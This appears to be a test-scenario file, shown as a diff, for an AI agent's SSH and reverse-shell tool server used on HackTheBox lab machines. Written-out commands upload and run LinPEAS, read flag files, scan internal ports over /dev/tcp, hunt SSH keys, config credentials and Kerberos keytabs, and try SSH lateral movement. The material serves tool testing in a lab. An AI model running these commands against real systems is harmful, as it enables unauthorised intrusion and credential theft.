+# Goal: Connect, upload LinPEAS, run it, download results
+# Target: Any Linux HTB box with valid SSH credentials
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish SSH session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Basic enumeration
+Method: exec
+Args: {session_id: <from step 1>, command: "id && hostname && uname -a", timeout: 30}
+Expected: success=true, exit_code=0, stdout contains "uid="
+
+## Step 3: Upload LinPEAS
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: <linpeas.sh content>,
+  remote_path: "/tmp/linpeas.sh",
+  mode: "0755"
+}
+Expected: success=true, size > 100000
+
+## Step 4: Run LinPEAS with increased timeout
+Method: exec
+Args: {session_id: <from step 1>, command: "/tmp/linpeas.sh 2>&1 | tee /tmp/linpeas_out.txt", timeout: 300}
+Expected: success=true, stdout contains enumeration output
+Notes: Increase timeout to 300s. LinPEAS takes 2-5 minutes. Pipe to tee for
+  later download in case output is truncated.
+
+## Step 5: Download LinPEAS output
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/tmp/linpeas_out.txt"}
+Expected: success=true, content contains enumeration results, size > 10000
+
+## Step 6: Download user flag
+Method: download
+Args: {session_id: <from step 1>, remote_path: "/home/<USER>/user.txt"}
+Expected: success=true, content is 32-char hex hash
+
+## Step 7: Clean up
+Method: exec
+Args: {session_id: <from step 1>, command: "rm -f /tmp/linpeas.sh /tmp/linpeas_out.txt", timeout: 10}
+Method: close
+Args: {session_id: <from step 1>}
+
+# ===============================================================================
+# ERROR SCENARIOS
+# Scenarios E1-E18: Error classification, recovery, edge cases
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SSH CONNECT ERRORS (E1-E7)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario E1: Wrong credentials
+Method: ssh_connect
+Args: {host: <TARGET>, username: "root", password: "definitelywrong123", timeout: 10}
+Expected: success=false, error_class="auth", retryable=false
+Notes: Authentication error should NOT be retried. No retry loop.
+
+## Scenario E2: Connection refused (SSH not running or wrong port)
+Method: ssh_connect
+Args: {host: <TARGET>, username: "root", password: "test", port: 19999, timeout: 5}
+Expected: success=false, error_class="network", retryable=true
+
+## Scenario E3: Unreachable host
+Method: ssh_connect
+Args: {host: "192.0.2.1", username: "root", password: "test", timeout: 3}
+Expected: success=false, error_class="timeout" or "network"
+Notes: TEST-NET address (RFC 5737), guaranteed unreachable. Verify the actual
+  duration is close to timeout, not 600s+ (see E7 for the timeout bug).
+
+## Scenario E4: No credentials provided
+Method: ssh_connect
+Args: {host: <TARGET>, username: "root", port: 22}
+Expected: success=false, error_class="params", error contains "Either password or private_key is required"
+Notes: Caught before any network call. Instant response.
+
+## Scenario E5: Invalid SSH key format
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, private_key: "not_a_valid_base64_key"}
+Expected: success=false, error_class="config", error contains "Invalid SSH key format"
+Notes: From engagement data: "encountered RSA key, expected EC key" when wrong key
+  type was tried. Server tries RSA -> Ed25519 -> ECDSA in sequence.
+
+## Scenario E6: Wrong key type (key exists but doesn't match server)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, private_key: <VALID_BUT_WRONG_KEY_BASE64>}
+Expected: success=false, error_class="auth", retryable=false
+Notes: Valid key file but not authorized on the target.
+
+## Scenario E7: SSH connect timeout bug (paramiko timeout ignored)
+Method: ssh_connect
+Args: {host: <TARGET_THAT_HANGS>, username: "root", password: "test", timeout: 15}
+Expected: success=false, error_class="timeout"
+KNOWN BUG: Engagement data shows 14 ssh_connect calls where timeout=15-30s but actual
+  duration was 585-715s. The asyncio.wait_for with overall_timeout=timeout+10 should
+  catch this, but engagement data suggests it doesn't always work.
+  Verify: actual duration should be close to (timeout + 10), NOT 10-20x timeout.
+Notes: This is the most critical ssh_connect bug. Hosts that accept TCP connection
+  but stall during SSH handshake trigger this. Reproduce with a host that has SSH
+  port open but responds very slowly (e.g., tarpit).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# EXEC ERRORS (E8-E12)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario E8: Exec on closed session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+-> session_id = result
+Method: close
+Args: {session_id: <session_id>}
+Method: exec
+Args: {session_id: <session_id>, command: "id"}
+Expected: success=false, error_class="params", error contains "not found"
+Notes: Most common error in engagement data: 14 occurrences. Agent uses stale
+  session IDs after container restart or session timeout.
+
+## Scenario E9: Exec on disconnected session (network loss)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+-> session_id
+Notes: Kill the SSH connection externally (e.g., iptables drop, kill SSH daemon).
+Method: exec
+Args: {session_id: <session_id>, command: "id"}
+Expected: success=false, error_class="network", retryable=true,
+  error contains "Session disconnected"
+Notes: The is_connected() check catches this. Session is removed from storage.
+  Subsequent calls will get "not found" instead of "disconnected".
+
+## Scenario E10: Command timeout (session survives)
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+-> session_id
+Method: exec
+Args: {session_id: <session_id>, command: "sleep 60", timeout: 3}
+Expected: success=false, error_class="timeout", retryable=true, timed_out=true
+Notes: Server should recover — subsequent commands on same session should work.
+  Suggestions should include "run in background with &" and "increase timeout".
+
+## Scenario E11: Command with restricted shell (rbash)
+Method: ssh_connect
+Args: {host: <TARGET_WITH_RBASH>, username: <RESTRICTED_USER>, password: <PASS>}
+-> session_id
+Method: exec
+Args: {session_id: <session_id>, command: "/dev/tcp/127.0.0.1/80", timeout: 10}
+Expected: success=true, exit_code != 0, stderr contains "rbash" or "restricted"
+Notes: 3 occurrences in engagement data. The exec succeeds (tool-level) but the
+  command fails (shell-level) due to rbash restrictions.
+
+## Scenario E12: Permission denied on privileged operation
+Method: ssh_connect
+Args: {host: <TARGET>, username: <LOW_PRIV_USER>, password: <PASS>}
+-> session_id
+Method: exec
+Args: {session_id: <session_id>, command: "cat /root/root.txt", timeout: 10}
+Expected: success=true, exit_code != 0, stderr contains "Permission denied"
+Notes: 12 occurrences in engagement data. Not a tool error — the command executed
+  but the OS denied access. Agent decides how to handle (escalate, try different path).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# UPLOAD/DOWNLOAD ERRORS (E13-E14)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario E13: Upload to closed session
+Method: upload
+Args: {session_id: "ses_nonexistent_upload", content: "test", remote_path: "/tmp/x"}
+Expected: success=false, error_class="params", error contains "not found"
+Notes: 1 occurrence in engagement data. Same stale session ID pattern as E8.
+
+## Scenario E14: Download nonexistent file
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+-> session_id
+Method: download
+Args: {session_id: <session_id>, remote_path: "/root/this_does_not_exist_xyzzy"}
+Expected: success=false, error contains "not found" or "No such file"
+Method: close
+Args: {session_id: <session_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# REVERSE SHELL ERRORS (E15-E18)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario E15: Listen timeout (no connection)
+Method: listen
+Args: {port: 44444, timeout: 5}
+Expected: success=false, error_class="timeout", retryable=true,
+  error contains "No connection received within 5 seconds"
+Notes: No reverse shell triggers, so the listener should timeout.
+
+## Scenario E16: Listen on port already in use
+Method: listen
+Args: {port: 22, timeout: 5}
+Expected: success=false, error_class="config", error contains "already in use"
+Notes: Port 22 is typically in use by SSH daemon.
+
+## Scenario E17: shell_exec on nonexistent session
+Method: shell_exec
+Args: {session_id: "ses_fakeshell123", command: "id"}
+Expected: success=false, error_class="params", error contains "not found"
+Notes: Verifies shell_exec requires a reverse shell session from listen.
+
+## Scenario E18: upgrade_shell on nonexistent session
+Method: upgrade_shell
+Args: {session_id: "ses_fakeshell456"}
+Expected: success=false, error_class="params", error contains "not found"
+Notes: upgrade_shell only works on reverse shell sessions, not SSH sessions.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CLOSE ERRORS (E19)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario E19: Close nonexistent session
+Method: close
+Args: {session_id: "ses_nonexistent99"}
+Expected: success=false, error_class="params"
+
+# ===============================================================================
+# ENGAGEMENT-OBSERVED PATTERNS
+# Scenarios 21-25: Real-world patterns from trajectory data
+# ===============================================================================
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 21: WiFi/IoT Long-Running Attack Scripts (Engagement Pattern)
+# Goal: Test the pattern of uploading and running long-running attack scripts
+# Target: Box with network access for script execution
+# Notes: Engagement data shows evil_twin scripts running 60-215s, PMKID captures
+#   running 134-601s. Agent wraps with sudo and timeout.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Upload attack script
+Method: upload
+Args: {
+  session_id: <from step 1>,
+  content: "#!/bin/bash\n# Simulated long-running attack\nfor i in $(seq 1 10); do\n  echo \"Phase $i/10\"\n  sleep 1\ndone\necho ATTACK_COMPLETE\n",
+  remote_path: "/tmp/attack_script.sh",
+  mode: "0755"
+}
+Expected: success=true
+
+## Step 3: Run with timeout wrapper
+Method: exec
+Args: {session_id: <from step 1>, command: "timeout 30 /tmp/attack_script.sh 2>&1", timeout: 45}
+Expected: success=true, stdout contains "ATTACK_COMPLETE"
+Notes: Engagement pattern: timeout N wraps the command, exec timeout set slightly higher.
+
+## Step 4: Run in background and poll
+Method: exec
+Args: {session_id: <from step 1>, command: "nohup /tmp/attack_script.sh > /tmp/attack_out.txt 2>&1 &", timeout: 10}
+Expected: success=true, exit_code=0
+
+## Step 5: Poll for results
+Method: exec
+Args: {session_id: <from step 1>, command: "sleep 12 && cat /tmp/attack_out.txt", timeout: 20}
+Expected: success=true, stdout contains "ATTACK_COMPLETE"
+Notes: Wait for script to finish, then check output.
+
+## Step 6: Clean up
+Method: exec
+Args: {session_id: <from step 1>, command: "rm -f /tmp/attack_script.sh /tmp/attack_out.txt", timeout: 10}
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 22: Command Not Found Recovery (Engagement Pattern)
+# Goal: Handle missing tools and adapt command strategy
+# Target: Minimal Linux container or restricted environment
+# Notes: 7 "command not found" errors in engagement data (dig, nslookup, ping,
+#   docker, etc.). Agent adapts by trying alternative tools.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Try a command that may not exist
+Method: exec
+Args: {session_id: <from step 1>, command: "dig @8.8.8.8 example.com 2>&1", timeout: 10}
+Expected: success=true, exit_code=127 (or similar), stderr contains "command not found"
+  OR success=true, exit_code=0 if dig is installed
+
+## Step 3: Fallback to alternative tool
+Method: exec
+Args: {session_id: <from step 1>, command: "host example.com 2>&1 || nslookup example.com 2>&1 || python3 -c \"import socket; print(socket.gethostbyname('example.com'))\" 2>&1", timeout: 15}
+Expected: success=true, stdout contains IP address resolution
+Notes: Agent pattern: chain fallback commands to find one that works.
+
+## Step 4: Check available tools
+Method: exec
+Args: {session_id: <from step 1>, command: "which curl wget python3 nc nmap 2>/dev/null || echo NONE_FOUND", timeout: 10}
+Expected: success=true, stdout lists available tools
+
+## Step 5: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 23: Chained Commands with Error Isolation (Engagement Pattern)
+# Goal: Run complex multi-command pipelines as seen in real engagements
+# Target: Any Linux HTB box with SSH access
+# Notes: Engagement data shows heavy use of &&, ||, ;, and pipe chains.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Multi-command with separator
+Method: exec
+Args: {session_id: <from step 1>, command: "echo '=== Users ===' && cat /etc/passwd | wc -l && echo '=== Groups ===' && cat /etc/group | wc -l", timeout: 15}
+Expected: success=true, stdout contains "=== Users ===" and "=== Groups ==="
+
+## Step 3: Conditional command chain
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /root/root.txt 2>/dev/null || echo 'NO_ROOT_FLAG' && cat /home/*/user.txt 2>/dev/null || echo 'NO_USER_FLAG'", timeout: 15}
+Expected: success=true, stdout contains either flags or NO_*_FLAG markers
+
+## Step 4: Here-document (heredoc) for multi-line script
+Method: exec
+Args: {session_id: <from step 1>, command: "cat > /tmp/inline.sh << 'EOF'\n#!/bin/bash\nfor port in 22 80 443; do\n  (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"Port $port open\" || echo \"Port $port closed\"\ndone\nEOF\nchmod +x /tmp/inline.sh && /tmp/inline.sh", timeout: 15}
+Expected: success=true, stdout shows port status for each port
+
+## Step 5: Clean up
+Method: exec
+Args: {session_id: <from step 1>, command: "rm -f /tmp/inline.sh", timeout: 5}
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 24: Docker Container Enumeration via SSH (Engagement Pattern)
+# Goal: Enumerate Docker containers and escape opportunities from inside a host
+# Target: HTB box running Docker (Fries, etc.)
+# Notes: Engagement data shows docker enumeration, exec into containers, and
+#   container escape attempts.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Check Docker availability
+Method: exec
+Args: {session_id: <from step 1>, command: "which docker && docker ps 2>&1 || echo 'DOCKER_UNAVAILABLE'", timeout: 15}
+Expected: success=true, stdout lists containers or "DOCKER_UNAVAILABLE"
+Notes: From engagement data: "sudo: docker: command not found" is a common result.
+
+## Step 3: Enumerate container details (if Docker available)
+Method: exec
+Args: {session_id: <from step 1>, command: "docker ps --format '{{.Names}}\\t{{.Image}}\\t{{.Status}}' 2>&1", timeout: 15}
+Expected: success=true, stdout lists container names and images
+
+## Step 4: Exec into container
+Method: exec
+Args: {session_id: <from step 1>, command: "docker exec -t <CONTAINER_NAME> id 2>&1", timeout: 15}
+Expected: success=true, stdout contains uid= from inside the container
+
+## Step 5: Check Docker socket permissions
+Method: exec
+Args: {session_id: <from step 1>, command: "ls -la /var/run/docker.sock 2>&1", timeout: 10}
+Expected: success=true, stdout shows socket permissions (e.g., srw-rw---- root docker)
+
+## Step 6: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 25: Network Enumeration From Compromised Host (Engagement Pattern)
+# Goal: Use SSH session for internal network discovery
+# Target: Any Linux HTB box with network access to internal targets
+# Notes: Engagement data shows arp-scan, nmap from SSH sessions, SNMP walks,
+#   and /dev/tcp port scanning — all run through exec.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Discover network interfaces
+Method: exec
+Args: {session_id: <from step 1>, command: "ip addr show 2>/dev/null || ifconfig 2>/dev/null", timeout: 15}
+Expected: success=true, stdout contains interface information
+
+## Step 3: ARP table discovery
+Method: exec
+Args: {session_id: <from step 1>, command: "arp -a 2>/dev/null || ip neigh show 2>/dev/null", timeout: 15}
+Expected: success=true, stdout contains neighbor entries
+
+## Step 4: Bash-based port scan (no tools required)
+Method: exec
+Args: {session_id: <from step 1>, command: "for p in 22 80 443 445 3306 8080 8443; do (echo >/dev/tcp/<INTERNAL_TARGET>/$p) 2>/dev/null && echo \"$p open\"; done", timeout: 30}
+Expected: success=true, stdout lists open ports
+
+## Step 5: DNS resolution check
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/resolv.conf && cat /etc/hosts", timeout: 10}
+Expected: success=true, stdout contains DNS and hosts configuration
+
+## Step 6: SNMP enumeration (if snmpwalk available)
+Method: exec
+Args: {session_id: <from step 1>, command: "snmpwalk -v2c -c public -t 3 -r 1 <INTERNAL_TARGET> 1.3.6.1.2.1.1 2>&1 | head -20", timeout: 30}
+Expected: success=true, stdout contains SNMP data or "command not found"
+
+## Step 7: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 26: Credential Discovery and Lateral Movement (Engagement Pattern)
+# Goal: Use SSH session to find credentials and move laterally
+# Target: Linux HTB box with config files containing credentials
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Search for credential files
+Method: exec
+Args: {session_id: <from step 1>, command: "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '.env' -o -name 'wp-config.php' 2>/dev/null | head -20", timeout: 30}
+Expected: success=true, stdout lists config file paths
+
+## Step 3: Check SSH keys
+Method: exec
+Args: {session_id: <from step 1>, command: "find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null", timeout: 15}
+Expected: success=true, stdout lists key file paths
+
+## Step 4: Read a config file for creds
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/krb5.keytab 2>/dev/null | xxd | head -20 || echo 'NO_KEYTAB'", timeout: 15}
+Expected: success=true, stdout contains hex dump or NO_KEYTAB
+
+## Step 5: Try found credentials for lateral movement
+Method: exec
+Args: {session_id: <from step 1>, command: "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes <USER2>@<TARGET2> 'id' 2>&1", timeout: 30}
+Expected: success=true, stdout contains uid= or "Permission denied"
+Notes: From engagement data: multiple SSH lateral movement attempts with -o BatchMode=yes.
+
+## Step 6: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 27: Kerberos and Active Directory Enumeration via SSH (Engagement Pattern)
+# Goal: Run AD enumeration tools through SSH session
+# Target: Domain-joined Linux box (Fries.HTB, etc.)
+# Notes: Engagement data shows ldapsearch, kinit, smbclient commands via SSH.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish session
+Method: ssh_connect
+Args: {host: <TARGET>, username: <USER>, password: <PASS>}
+Expected: success=true
+
+## Step 2: Check Kerberos configuration
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/krb5.conf 2>/dev/null || echo 'NO_KRB5_CONF'", timeout: 10}
+Expected: success=true
+
+## Step 3: Check Kerberos tickets
+Method: exec
+Args: {session_id: <from step 1>, command: "klist 2>&1 || echo 'NO_TICKETS'", timeout: 10}
+Expected: success=true
+
+## Step 4: LDAP enumeration
+Method: exec
+Args: {session_id: <from step 1>, command: "ldapsearch -x -H ldap://localhost -b 'dc=fries,dc=htb' '(objectClass=user)' sAMAccountName 2>&1 | head -30", timeout: 30}
+Expected: success=true, stdout contains LDAP results or error
+
+## Step 5: Check NFS exports
+Method: exec
+Args: {session_id: <from step 1>, command: "cat /etc/exports 2>/dev/null && showmount -e localhost 2>/dev/null || echo 'NO_NFS'", timeout: 15}
+Expected: success=true
+
+## Step 6: Clean up
+Method: close
+Args: {session_id: <from step 1>}
+
+# ===============================================================================
+# SCENARIO COUNT: 27 functional + 19 error = 46 total scenarios
+# METHOD COVERAGE:
+#   ssh_connect: S1, S2, S3, E1-E7 (10 scenarios)
+#   exec:        S4, S5, S6, S18-S27, E8-E12 (19 scenarios)
+#   upload:      S7, S8, S20, S21, E13 (5 scenarios)
+#   download:    S9, S20, E14 (3 scenarios)
+#   listen:      S10-S14, S16, E15-E16 (8 scenarios)
+#   shell_exec:  S10-S14, S16, E17 (7 scenarios)
+#   upgrade_shell: S10, S12, E18 (3 scenarios)
+#   close:       S1-S3, S6-S10, S12-S21, S23-S27, E8, E14, E19 (26 scenarios)
+#   list_sessions: S1, S15-S16, S18 (4 scenarios)
+# ===============================================================================
